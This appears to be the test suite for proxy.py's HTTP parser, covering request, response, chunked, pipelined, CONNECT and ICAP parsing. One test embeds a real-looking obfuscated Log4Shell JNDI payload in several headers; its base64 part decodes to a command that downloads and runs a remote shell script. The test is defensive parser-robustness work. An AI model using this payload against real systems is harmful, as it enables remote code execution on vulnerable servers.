# -*- coding: utf-8 -*-
"""
    proxy.py
    ~~~~~~~~
    ⚡⚡⚡ Fast, Lightweight, Pluggable, TLS interception capable proxy server focused on
    Network monitoring, controls & Application development, testing, debugging.

    :copyright: (c) 2013-present by Abhinav Singh and contributors.
    :license: BSD, see LICENSE for more details.
"""
import unittest

from proxy.http import httpMethods
from proxy.http.parser import HttpParser, httpParserTypes, httpParserStates
from proxy.common.utils import (
    bytes_, find_http_line, build_http_header, build_http_request,
)
from proxy.http.exception import HttpProtocolException
from proxy.http.responses import okResponse
from proxy.common.constants import CRLF, HTTP_1_0


class TestHttpParser(unittest.TestCase):

    def setUp(self) -> None:
        self.parser = HttpParser(httpParserTypes.REQUEST_PARSER)

    def test_issue_127(self) -> None:
        with self.assertRaises(HttpProtocolException):
            self.parser.parse(CRLF)

        with self.assertRaises(HttpProtocolException):
            raw = b'qwqrqw!@!#@!#ad adfad\r\n'
            while True:
                self.parser.parse(raw)

    def test_issue_398(self) -> None:
        p = HttpParser(httpParserTypes.RESPONSE_PARSER)
        p.parse(HTTP_1_0 + b' 200 OK' + CRLF)
        self.assertEqual(p.version, HTTP_1_0)
        self.assertEqual(p.code, b'200')
        self.assertEqual(p.reason, b'OK')
        self.assertEqual(p.state, httpParserStates.LINE_RCVD)
        p.parse(
            b'CP=CAO PSA OUR' + CRLF +
            b'Cache-Control:private,max-age=0;' + CRLF +
            b'X-Frame-Options:SAMEORIGIN' + CRLF +
            b'X-Content-Type-Options:nosniff' + CRLF +
            b'X-XSS-Protection:1; mode=block' + CRLF +
            b'Content-Security-Policy:default-src \'self\' \'unsafe-inline\' \'unsafe-eval\'' + CRLF +
            b'Strict-Transport-Security:max-age=2592000; includeSubdomains' + CRLF +
            b'Set-Cookie: lang=eng; path=/;HttpOnly;' + CRLF +
            b'Content-type:text/html;charset=UTF-8;' + CRLF + CRLF +
            b'<!-- HTML RESPONSE HERE -->',
        )
        self.assertEqual(p.body, b'<!-- HTML RESPONSE HERE -->')
        self.assertEqual(p.state, httpParserStates.RCVING_BODY)

    def test_urlparse(self) -> None:
        self.parser.parse(b'CONNECT httpbin.org:443 HTTP/1.1\r\n')
        self.assertTrue(self.parser.is_https_tunnel)
        self.assertFalse(self.parser.is_connection_upgrade)
        self.assertTrue(self.parser.is_http_1_1_keep_alive)
        self.assertFalse(self.parser.content_expected)
        self.assertFalse(self.parser.body_expected)
        self.assertEqual(self.parser.host, b'httpbin.org')
        self.assertEqual(self.parser.port, 443)
        self.assertNotEqual(self.parser.state, httpParserStates.COMPLETE)

    def test_urlparse_on_invalid_connect_request(self) -> None:
        self.parser.parse(b'CONNECT / HTTP/1.0\r\n\r\n')
        self.assertTrue(self.parser.is_https_tunnel)
        self.assertEqual(self.parser.host, None)
        self.assertEqual(self.parser.port, 443)
        self.assertEqual(self.parser.state, httpParserStates.COMPLETE)

    def test_unicode_character_domain_connect(self) -> None:
        self.parser.parse(bytes_('CONNECT ççç.org:443 HTTP/1.1\r\n'))
        self.assertTrue(self.parser.is_https_tunnel)
        self.assertEqual(self.parser.host, bytes_('ççç.org'))
        self.assertEqual(self.parser.port, 443)

    def test_invalid_ipv6_in_request_line(self) -> None:
        self.parser.parse(
            bytes_('CONNECT 2001:db8:3333:4444:CCCC:DDDD:EEEE:FFFF:443 HTTP/1.1\r\n'),
        )
        self.assertTrue(self.parser.is_https_tunnel)
        self.assertEqual(
            self.parser.host, bytes_(
                '[2001:db8:3333:4444:CCCC:DDDD:EEEE:FFFF]',
            ),
        )
        self.assertEqual(self.parser.port, 443)

    def test_valid_ipv6_in_request_line(self) -> None:
        self.parser.parse(
            bytes_(
                'CONNECT [2001:db8:3333:4444:CCCC:DDDD:EEEE:FFFF]:443 HTTP/1.1\r\n',
            ),
        )
        self.assertTrue(self.parser.is_https_tunnel)
        self.assertEqual(
            self.parser.host, bytes_(
                '[2001:db8:3333:4444:CCCC:DDDD:EEEE:FFFF]',
            ),
        )
        self.assertEqual(self.parser.port, 443)

    def test_build_request(self) -> None:
        self.assertEqual(
            build_http_request(
                b'GET', b'http://localhost:12345', b'HTTP/1.1',
            ),
            CRLF.join([
                b'GET http://localhost:12345 HTTP/1.1',
                CRLF,
            ]),
        )
        self.assertEqual(
            build_http_request(
                b'GET', b'http://localhost:12345', b'HTTP/1.1',
                headers={b'key': b'value'},
            ),
            CRLF.join([
                b'GET http://localhost:12345 HTTP/1.1',
                b'key: value',
                CRLF,
            ]),
        )
        self.assertEqual(
            build_http_request(
                b'GET', b'http://localhost:12345', b'HTTP/1.1',
                headers={b'key': b'value'},
                body=b'Hello from py',
            ),
            CRLF.join([
                b'GET http://localhost:12345 HTTP/1.1',
                b'key: value',
                CRLF,
            ]) + b'Hello from py',
        )

    def test_build_response(self) -> None:
        self.assertEqual(
            okResponse(protocol_version=b'HTTP/1.1'),
            CRLF.join([
                b'HTTP/1.1 200 OK',
                CRLF,
            ]),
        )
        self.assertEqual(
            okResponse(
                headers={b'key': b'value'},
                protocol_version=b'HTTP/1.1',
            ),
            CRLF.join([
                b'HTTP/1.1 200 OK',
                b'key: value',
                CRLF,
            ]),
        )

    def test_build_response_adds_content_length_header(self) -> None:
        body = b'Hello world!!!'
        self.assertEqual(
            okResponse(
                headers={b'key': b'value'},
                content=body,
                protocol_version=b'HTTP/1.1',
            ),
            CRLF.join([
                b'HTTP/1.1 200 OK',
                b'key: value',
                b'Content-Length: ' + bytes_(len(body)),
                CRLF,
            ]) + body,
        )

    def test_build_header(self) -> None:
        self.assertEqual(
            build_http_header(
                b'key', b'value',
            ), b'key: value',
        )

    def test_header_raises(self) -> None:
        with self.assertRaises(KeyError):
            self.parser.header(b'not-found')

    def test_has_header(self) -> None:
        self.parser.add_header(b'key', b'value')
        self.assertFalse(self.parser.has_header(b'not-found'))
        self.assertTrue(self.parser.has_header(b'key'))

    def test_set_host_port_raises(self) -> None:
        # Assertion for url will fail
        with self.assertRaises(AssertionError):
            self.parser._set_line_attributes()

    def test_find_line(self) -> None:
        self.assertEqual(
            find_http_line(
                b'CONNECT python.org:443 HTTP/1.0\r\n\r\n',
            ),
            (
                b'CONNECT python.org:443 HTTP/1.0',
                CRLF,
            ),
        )

    def test_find_line_returns_None(self) -> None:
        self.assertEqual(
            find_http_line(b'CONNECT python.org:443 HTTP/1.0'),
            (
                None,
                b'CONNECT python.org:443 HTTP/1.0',
            ),
        )

    def test_connect_request_with_crlf_as_separate_chunk(self) -> None:
        """See https://github.com/abhinavsingh/py/issues/70 for background."""
        raw = b'CONNECT pypi.org:443 HTTP/1.0\r\n'
        self.parser.parse(raw)
        self.assertEqual(self.parser.state, httpParserStates.LINE_RCVD)
        self.parser.parse(CRLF)
        self.assertEqual(self.parser.state, httpParserStates.COMPLETE)

    def test_get_full_parse(self) -> None:
        raw = CRLF.join([
            b'GET %s HTTP/1.1',
            b'Host: %s',
            CRLF,
        ])
        pkt = raw % (
            b'https://example.com/path/dir/?a=b&c=d#p=q',
            b'example.com',
        )
        self.parser.parse(pkt)
        self.assertEqual(self.parser.total_size, len(pkt))
        assert self.parser._url and self.parser._url.remainder
        self.assertEqual(self.parser._url.remainder, b'/path/dir/?a=b&c=d#p=q')
        self.assertEqual(self.parser.method, b'GET')
        self.assertEqual(self.parser._url.hostname, b'example.com')
        self.assertEqual(self.parser._url.port, None)
        self.assertEqual(self.parser.version, b'HTTP/1.1')
        self.assertEqual(self.parser.state, httpParserStates.COMPLETE)
        assert self.parser.headers
        self.assertEqual(
            self.parser.headers[b'host'], (b'Host', b'example.com'),
        )
        self.parser.del_headers([b'host'])
        self.parser.add_headers([(b'Host', b'example.com')])
        self.assertEqual(
            raw %
            (
                b'/path/dir/?a=b&c=d#p=q',
                b'example.com',
            ),
            self.parser.build(),
        )

    def test_line_rcvd_to_rcving_headers_state_change(self) -> None:
        pkt = b'GET http://localhost HTTP/1.1'
        self.parser.parse(pkt)
        self.assertEqual(self.parser.total_size, len(pkt))
        self.assert_state_change_with_crlf(
            httpParserStates.INITIALIZED,
            httpParserStates.LINE_RCVD,
            httpParserStates.COMPLETE,
        )

    def test_get_partial_parse1(self) -> None:
        pkt = CRLF.join([
            b'GET http://localhost:8080 HTTP/1.1',
        ])
        self.parser.parse(pkt)
        self.assertEqual(self.parser.total_size, len(pkt))
        self.assertEqual(self.parser.method, None)
        self.assertEqual(self.parser._url, None)
        self.assertEqual(self.parser.version, None)
        self.assertEqual(
            self.parser.state,
            httpParserStates.INITIALIZED,
        )

        self.parser.parse(CRLF)
        self.assertEqual(self.parser.total_size, len(pkt) + len(CRLF))
        self.assertEqual(self.parser.method, b'GET')
        assert self.parser._url
        self.assertEqual(self.parser._url.hostname, b'localhost')
        self.assertEqual(self.parser._url.port, 8080)
        self.assertEqual(self.parser.version, b'HTTP/1.1')
        self.assertEqual(self.parser.state, httpParserStates.LINE_RCVD)

        host_hdr = b'Host: localhost:8080'
        self.parser.parse(host_hdr)
        self.assertEqual(
            self.parser.total_size,
            len(pkt) + len(CRLF) + len(host_hdr),
        )
        assert self.parser.headers is None
        self.assertEqual(self.parser.buffer, b'Host: localhost:8080')
        self.assertEqual(self.parser.state, httpParserStates.LINE_RCVD)

        self.parser.parse(CRLF * 2)
        self.assertEqual(
            self.parser.total_size, len(pkt) +
            (3 * len(CRLF)) + len(host_hdr),
        )
        assert self.parser.headers is not None
        self.assertEqual(
            self.parser.headers[b'host'],
            (
                b'Host',
                b'localhost:8080',
            ),
        )
        self.assertEqual(self.parser.state, httpParserStates.COMPLETE)

    def test_get_partial_parse2(self) -> None:
        self.parser.parse(
            CRLF.join([
                b'GET http://localhost:8080 HTTP/1.1',
                b'Host: ',
            ]),
        )
        self.assertEqual(self.parser.method, b'GET')
        assert self.parser._url
        self.assertEqual(self.parser._url.hostname, b'localhost')
        self.assertEqual(self.parser._url.port, 8080)
        self.assertEqual(self.parser.version, b'HTTP/1.1')
        self.assertEqual(self.parser.buffer, b'Host: ')
        self.assertEqual(self.parser.state, httpParserStates.LINE_RCVD)

        self.parser.parse(b'localhost:8080' + CRLF)
        assert self.parser.headers
        self.assertEqual(
            self.parser.headers[b'host'],
            (
                b'Host',
                b'localhost:8080',
            ),
        )
        self.assertEqual(self.parser.buffer, b'')
        self.assertEqual(
            self.parser.state,
            httpParserStates.RCVING_HEADERS,
        )

        self.parser.parse(b'Content-Type: text/plain' + CRLF)
        self.assertEqual(self.parser.buffer, b'')
        assert self.parser.headers
        self.assertEqual(
            self.parser.headers[b'content-type'], (
                b'Content-Type',
                b'text/plain',
            ),
        )
        self.assertEqual(
            self.parser.state,
            httpParserStates.RCVING_HEADERS,
        )

        self.parser.parse(CRLF)
        self.assertEqual(self.parser.state, httpParserStates.COMPLETE)

    def test_post_full_parse(self) -> None:
        raw = CRLF.join([
            b'POST %s HTTP/1.1',
            b'Host: localhost',
            b'Content-Length: 7',
            b'Content-Type: application/x-www-form-urlencoded' + CRLF,
            b'a=b&c=d',
        ])
        self.parser.parse(raw % b'http://localhost')
        self.assertEqual(self.parser.method, b'POST')
        assert self.parser._url
        self.assertEqual(self.parser._url.hostname, b'localhost')
        self.assertEqual(self.parser._url.port, None)
        self.assertEqual(self.parser.version, b'HTTP/1.1')
        assert self.parser.headers
        self.assertEqual(
            self.parser.headers[b'content-type'],
            (b'Content-Type', b'application/x-www-form-urlencoded'),
        )
        self.assertEqual(
            self.parser.headers[b'content-length'],
            (b'Content-Length', b'7'),
        )
        self.assertEqual(self.parser.body, b'a=b&c=d')
        self.assertEqual(self.parser.buffer, b'')
        self.assertEqual(self.parser.state, httpParserStates.COMPLETE)
        self.assertEqual(len(self.parser.build()), len(raw % b'/'))

    def assert_state_change_with_crlf(
        self,
        initial_state: int,
        next_state: int,
        final_state: int,
    ) -> None:
        self.assertEqual(self.parser.state, initial_state)
        self.parser.parse(CRLF)
        self.assertEqual(self.parser.state, next_state)
        self.parser.parse(CRLF)
        self.assertEqual(self.parser.state, final_state)

    def test_post_partial_parse(self) -> None:
        self.parser.parse(
            CRLF.join([
                b'POST http://localhost HTTP/1.1',
                b'Host: localhost',
                b'Content-Length: 7',
                b'Content-Type: application/x-www-form-urlencoded',
            ]),
        )
        self.assertEqual(self.parser.method, b'POST')
        assert self.parser._url
        self.assertEqual(self.parser._url.hostname, b'localhost')
        self.assertEqual(self.parser._url.port, None)
        self.assertEqual(self.parser.version, b'HTTP/1.1')
        self.assert_state_change_with_crlf(
            httpParserStates.RCVING_HEADERS,
            httpParserStates.RCVING_HEADERS,
            httpParserStates.HEADERS_COMPLETE,
        )

        self.parser.parse(b'a=b')
        self.assertEqual(
            self.parser.state,
            httpParserStates.RCVING_BODY,
        )
        self.assertEqual(self.parser.body, b'a=b')
        self.assertEqual(self.parser.buffer, b'')

        self.parser.parse(b'&c=d')
        self.assertEqual(self.parser.state, httpParserStates.COMPLETE)
        self.assertEqual(self.parser.body, b'a=b&c=d')
        self.assertEqual(self.parser.buffer, b'')

    def test_connect_request_without_host_header_request_parse(self) -> None:
        """Case where clients can send CONNECT request without a Host header field.

        Example:
            1. pip3 --proxy http://localhost:8899 install <package name>
               Uses HTTP/1.0, Host header missing with CONNECT requests
            2. Android Emulator
               Uses HTTP/1.1, Host header missing with CONNECT requests

        See https://github.com/abhinavsingh/py/issues/5 for details.
        """
        self.parser.parse(b'CONNECT pypi.org:443 HTTP/1.0\r\n\r\n')
        self.assertEqual(self.parser.method, httpMethods.CONNECT)
        self.assertEqual(self.parser.version, b'HTTP/1.0')
        self.assertEqual(self.parser.state, httpParserStates.COMPLETE)

    def test_request_parse_without_content_length(self) -> None:
        """Case when incoming request doesn't contain a content-length header.

        From http://w3-org.9356.n7.nabble.com/POST-with-empty-body-td103965.html
        'A POST with no content-length and no body is equivalent to a POST with Content-Length: 0
        and nothing following, as could perfectly happen when you upload an empty file for instance.'

        See https://github.com/abhinavsingh/py/issues/20 for details.
        """
        self.parser.parse(
            CRLF.join([
                b'POST http://localhost HTTP/1.1',
                b'Host: localhost',
                b'Content-Type: application/x-www-form-urlencoded',
                CRLF,
            ]),
        )
        self.assertEqual(self.parser.method, b'POST')
        self.assertEqual(self.parser.state, httpParserStates.COMPLETE)

    def test_response_parse_without_content_length(self) -> None:
        """Case when server response doesn't contain a content-length header for non-chunk response types.

        HttpParser by itself has no way to know if more data should be expected.
        In example below, parser reaches state httpParserStates.HEADERS_COMPLETE
        and it is responsibility of callee to change state to httpParserStates.COMPLETE
        when server stream closes.

        See https://github.com/abhinavsingh/proxy.py/issues/20 for details.

        Post commit https://github.com/abhinavsingh/proxy.py/commit/269484df2e89bc659124177d339d4fc59f280cba
        HttpParser would reach state COMPLETE also for RESPONSE_PARSER types and no longer
        it is callee responsibility to change state on stream close.  This was important because
        pipelined responses not trigger stream close but may receive multiple responses.
        """
        self.parser.type = httpParserTypes.RESPONSE_PARSER
        self.parser.parse(b'HTTP/1.0 200 OK' + CRLF)
        self.assertEqual(self.parser.code, b'200')
        self.assertEqual(self.parser.version, b'HTTP/1.0')
        self.assertEqual(self.parser.state, httpParserStates.LINE_RCVD)
        self.parser.parse(
            CRLF.join([
                b'Server: BaseHTTP/0.3 Python/2.7.10',
                b'Date: Thu, 13 Dec 2018 16:24:09 GMT',
                CRLF,
            ]),
        )
        self.assertEqual(
            self.parser.state,
            httpParserStates.COMPLETE,
        )

    def test_response_parse(self) -> None:
        self.parser.type = httpParserTypes.RESPONSE_PARSER
        self.parser.parse(
            b''.join([
                b'HTTP/1.1 301 Moved Permanently\r\n',
                b'Location: http://www.google.com/\r\n',
                b'Content-Type: text/html; charset=UTF-8\r\n',
                b'Date: Wed, 22 May 2013 14:07:29 GMT\r\n',
                b'Expires: Fri, 21 Jun 2013 14:07:29 GMT\r\n',
                b'Cache-Control: public, max-age=2592000\r\n',
                b'Server: gws\r\n',
                b'Content-Length: 219\r\n',
                b'X-XSS-Protection: 1; mode=block\r\n',
                b'X-Frame-Options: SAMEORIGIN\r\n\r\n',
                b'<HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">\n' +
                b'<TITLE>301 Moved</TITLE></HEAD>',
                b'<BODY>\n<H1>301 Moved</H1>\nThe document has moved\n' +
                b'<A HREF="http://www.google.com/">here</A>.\r\n</BODY></HTML>\r\n',
            ]),
        )
        self.assertEqual(self.parser.code, b'301')
        self.assertEqual(self.parser.reason, b'Moved Permanently')
        self.assertEqual(self.parser.version, b'HTTP/1.1')
        self.assertEqual(
            self.parser.body,
            b'<HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">\n' +
            b'<TITLE>301 Moved</TITLE></HEAD><BODY>\n<H1>301 Moved</H1>\nThe document has moved\n' +
            b'<A HREF="http://www.google.com/">here</A>.\r\n</BODY></HTML>\r\n',
        )
        assert self.parser.headers
        self.assertEqual(
            self.parser.headers[b'content-length'],
            (b'Content-Length', b'219'),
        )
        self.assertEqual(self.parser.state, httpParserStates.COMPLETE)

    def test_response_partial_parse(self) -> None:
        self.parser.type = httpParserTypes.RESPONSE_PARSER
        self.parser.parse(
            b''.join([
                b'HTTP/1.1 301 Moved Permanently\r\n',
                b'Location: http://www.google.com/\r\n',
                b'Content-Type: text/html; charset=UTF-8\r\n',
                b'Date: Wed, 22 May 2013 14:07:29 GMT\r\n',
                b'Expires: Fri, 21 Jun 2013 14:07:29 GMT\r\n',
                b'Cache-Control: public, max-age=2592000\r\n',
                b'Server: gws\r\n',
                b'Content-Length: 219\r\n',
                b'X-XSS-Protection: 1; mode=block\r\n',
                b'X-Frame-Options: SAMEORIGIN\r\n',
            ]),
        )
        assert self.parser.headers
        self.assertEqual(
            self.parser.headers[b'x-frame-options'],
            (b'X-Frame-Options', b'SAMEORIGIN'),
        )
        self.assertEqual(
            self.parser.state,
            httpParserStates.RCVING_HEADERS,
        )
        self.parser.parse(b'\r\n')
        self.assertEqual(
            self.parser.state,
            httpParserStates.HEADERS_COMPLETE,
        )
        self.parser.parse(
            b'<HTML><HEAD><meta http-equiv="content-type" content="text/html;charset=utf-8">\n' +
            b'<TITLE>301 Moved</TITLE></HEAD>',
        )
        self.assertEqual(
            self.parser.state,
            httpParserStates.RCVING_BODY,
        )
        self.parser.parse(
            b'<BODY>\n<H1>301 Moved</H1>\nThe document has moved\n' +
            b'<A HREF="http://www.google.com/">here</A>.\r\n</BODY></HTML>\r\n',
        )
        self.assertEqual(self.parser.state, httpParserStates.COMPLETE)

    def test_chunked_response_parse(self) -> None:
        self.parser.type = httpParserTypes.RESPONSE_PARSER
        self.parser.parse(
            b''.join([
                b'HTTP/1.1 200 OK\r\n',
                b'Content-Type: application/json\r\n',
                b'Date: Wed, 22 May 2013 15:08:15 GMT\r\n',
                b'Server: gunicorn/0.16.1\r\n',
                b'transfer-encoding: chunked\r\n',
                b'Connection: keep-alive\r\n\r\n',
                b'4\r\n',
                b'Wiki\r\n',
                b'5\r\n',
                b'pedia\r\n',
                b'E\r\n',
                b' in\r\n\r\nchunks.\r\n',
                b'0\r\n',
                b'\r\n',
            ]),
        )
        self.assertEqual(self.parser.body, b'Wikipedia in\r\n\r\nchunks.')
        self.assertEqual(self.parser.state, httpParserStates.COMPLETE)

    def test_pipelined_response_parse(self) -> None:
        self.assert_pipeline_response(
            okResponse(
                headers={
                    b'Content-Length': b'15',
                },
                content=b'{"key":"value"}',
            ),
        )

    def test_pipelined_chunked_response_parse(self) -> None:
        self.assert_pipeline_response(
            okResponse(
                headers={
                    b'Transfer-Encoding': b'chunked',
                    b'Content-Type': b'application/json',
                },
                content=b'f\r\n{"key":"value"}\r\n0\r\n\r\n',
                compress=False,
            ),
        )

    def assert_pipeline_response(self, response: memoryview) -> None:
        self.parser = HttpParser(httpParserTypes.RESPONSE_PARSER)
        self.parser.parse(response.tobytes() + response.tobytes())
        self.assertEqual(self.parser.state, httpParserStates.COMPLETE)
        self.assertEqual(self.parser.body, b'{"key":"value"}')
        self.assertEqual(self.parser.buffer, response)

        # parse buffer
        parser = HttpParser(httpParserTypes.RESPONSE_PARSER)
        parser.parse(self.parser.buffer)
        self.assertEqual(parser.state, httpParserStates.COMPLETE)
        self.assertEqual(parser.body, b'{"key":"value"}')
        self.assertEqual(parser.buffer, b'')

    def test_chunked_request_parse(self) -> None:
        self.parser.parse(
            build_http_request(
                httpMethods.POST,
                b'http://example.org/',
                headers={
                    b'Transfer-Encoding': b'chunked',
                    b'Content-Type': b'application/json',
                },
                body=b'f\r\n{"key":"value"}\r\n0\r\n\r\n',
            ),
        )
        self.assertEqual(self.parser.body, b'{"key":"value"}')
        self.assertEqual(self.parser.state, httpParserStates.COMPLETE)
        self.assertEqual(
            self.parser.build(), build_http_request(
                httpMethods.POST,
                b'/',
                headers={
                    b'Transfer-Encoding': b'chunked',
                    b'Content-Type': b'application/json',
                },
                body=b'f\r\n{"key":"value"}\r\n0\r\n\r\n',
            ),
        )

    def test_is_http_1_1_keep_alive(self) -> None:
        self.parser.parse(
            build_http_request(
                httpMethods.GET, b'/',
            ),
        )
        self.assertTrue(self.parser.is_http_1_1_keep_alive)

    def test_is_http_1_1_keep_alive_with_non_close_connection_header(self) -> None:
        self.parser.parse(
            build_http_request(
                httpMethods.GET, b'/',
                headers={
                    b'Connection': b'keep-alive',
                },
            ),
        )
        self.assertTrue(self.parser.is_http_1_1_keep_alive)

    def test_is_not_http_1_1_keep_alive_with_close_header(self) -> None:
        self.parser.parse(
            build_http_request(
                httpMethods.GET, b'/',
                conn_close=True,
            ),
        )
        self.assertFalse(self.parser.is_http_1_1_keep_alive)

    def test_is_not_http_1_1_keep_alive_for_http_1_0(self) -> None:
        self.parser.parse(
            build_http_request(
                httpMethods.GET, b'/', protocol_version=b'HTTP/1.0',
            ),
        )
        self.assertFalse(self.parser.is_http_1_1_keep_alive)

    def test_paramiko_doc(self) -> None:
        response = b'HTTP/1.1 304 Not Modified\r\nDate: Tue, 03 Dec 2019 02:31:55 GMT\r\nConnection: keep-alive' \
                   b'\r\nLast-Modified: Sun, 23 Jun 2019 22:58:21 GMT\r\nETag: "5d10040d-1af2c"' \
                   b'\r\nX-Cname-TryFiles: True\r\nX-Served: Nginx\r\nX-Deity: web02\r\nCF-Cache-Status: DYNAMIC' \
                   b'\r\nServer: cloudflare\r\nCF-RAY: 53f2208c6fef6c38-SJC\r\n\r\n'
        self.parser = HttpParser(httpParserTypes.RESPONSE_PARSER)
        self.parser.parse(response)
        self.assertEqual(self.parser.state, httpParserStates.COMPLETE)

    def test_request_factory(self) -> None:
        r = HttpParser.request(
            b'POST http://localhost:12345 HTTP/1.1' + CRLF +
            b'key: value' + CRLF +
            b'Content-Length: 13' + CRLF + CRLF +
            b'Hello from py',
        )
        self.assertEqual(r.host, b'localhost')
        self.assertEqual(r.port, 12345)
        self.assertEqual(r.path, None)
        self.assertEqual(r.header(b'key'), b'value')
        self.assertEqual(r.header(b'KEY'), b'value')
        self.assertEqual(r.header(b'content-length'), b'13')
        self.assertEqual(r.body, b'Hello from py')

    def test_response_factory(self) -> None:
        r = HttpParser.response(
            b'HTTP/1.1 200 OK\r\nkey: value\r\n\r\n',
        )
        self.assertEqual(r.code, b'200')
        self.assertEqual(r.reason, b'OK')
        self.assertEqual(r.header(b'key'), b'value')

    def test_proxy_protocol(self) -> None:
        r = HttpParser.request(
            b'PROXY TCP4 192.168.0.1 192.168.0.11 56324 443' + CRLF +
            b'GET / HTTP/1.1' + CRLF +
            b'Host: 192.168.0.11' + CRLF + CRLF,
            enable_proxy_protocol=True,
        )
        self.assertTrue(r.protocol is not None)
        assert r.protocol and r.protocol.version and \
            r.protocol.family and \
            r.protocol.source and \
            r.protocol.destination
        self.assertEqual(r.protocol.version, 1)
        self.assertEqual(r.protocol.family, b'TCP4')
        self.assertEqual(r.protocol.source, (b'192.168.0.1', 56324))
        self.assertEqual(r.protocol.destination, (b'192.168.0.11', 443))

    def test_proxy_protocol_not_for_response_parser(self) -> None:
        with self.assertRaises(AssertionError):
            HttpParser(
                httpParserTypes.RESPONSE_PARSER,
                enable_proxy_protocol=True,
            )

    def test_is_safe_against_malicious_requests(self) -> None:
        self.parser.parse(
            b'GET / HTTP/1.1\r\n' +
            b'Host: 34.131.9.210:443\r\n' +
            b'User-Agent: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:' +
            b'//198.98.53.25:1389/TomcatBypass/Command/Base64d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pd' +
            b'C5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOw==}\r\n' +
            b'Content-Type: application/x-www-form-urlencoded\r\n' +
            b'nReferer: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:' +
            b'//198.98.53.25:1389/TomcatBypass/Command/Base64d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pd' +
            b'C5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOw==}\r\n' +
            b'X-Api-Version: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}' +
            b'://198.98.53.25:1389/TomcatBypass/Command/Base64d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pd' +
            b'C5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOw==}\r\n' +
            b'Cookie: ${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:' +
            b'//198.98.53.25:1389/TomcatBypass/Command/Base64d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pd' +
            b'C5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOw==}' +
            b'\r\n\r\n',
        )
        self.assertEqual(
            self.parser.header(b'user-agent'),
            b'${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:' +
            b'//198.98.53.25:1389/TomcatBypass/Command/Base64d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pd' +
            b'C5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOw==}',
        )
        self.assertEqual(
            self.parser.header(b'content-type'),
            b'application/x-www-form-urlencoded',
        )
        self.assertEqual(
            self.parser.header(b'nreferer'),
            b'${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:' +
            b'//198.98.53.25:1389/TomcatBypass/Command/Base64d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pd' +
            b'C5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOw==}',
        )
        self.assertEqual(
            self.parser.header(b'X-Api-Version'),
            b'${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}' +
            b'://198.98.53.25:1389/TomcatBypass/Command/Base64d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pd' +
            b'C5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOw==}',
        )
        self.assertEqual(
            self.parser.header(b'cookie'),
            b'${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}:' +
            b'//198.98.53.25:1389/TomcatBypass/Command/Base64d2dldCA0Ni4xNjEuNTIuMzcvRXhwbG9pd' +
            b'C5zaDsgY2htb2QgK3ggRXhwbG9pdC5zaDsgLi9FeHBsb2l0LnNoOw==}',
        )

    def test_parses_icap_protocol(self) -> None:
        # Ref https://datatracker.ietf.org/doc/html/rfc3507
        self.parser.parse(
            b'REQMOD icap://icap-server.net/server?arg=87 ICAP/1.0\r\n' +
            b'Host: icap-server.net\r\n' +
            b'Encapsulated: req-hdr=0, req-body=154' +
            b'\r\n\r\n' +
            b'POST /origin-resource/form.pl HTTP/1.1\r\n' +
            b'Host: www.origin-server.com\r\n' +
            b'Accept: text/html, text/plain\r\n' +
            b'Accept-Encoding: compress\r\n' +
            b'Cache-Control: no-cache\r\n' +
            b'\r\n' +
            b'1e\r\n' +
            b'I am posting this information.\r\n' +
            b'0\r\n' +
            b'\r\n',
        )
        self.assertEqual(self.parser.method, b'REQMOD')
        assert self.parser._url is not None
        self.assertEqual(self.parser._url.scheme, b'icap')
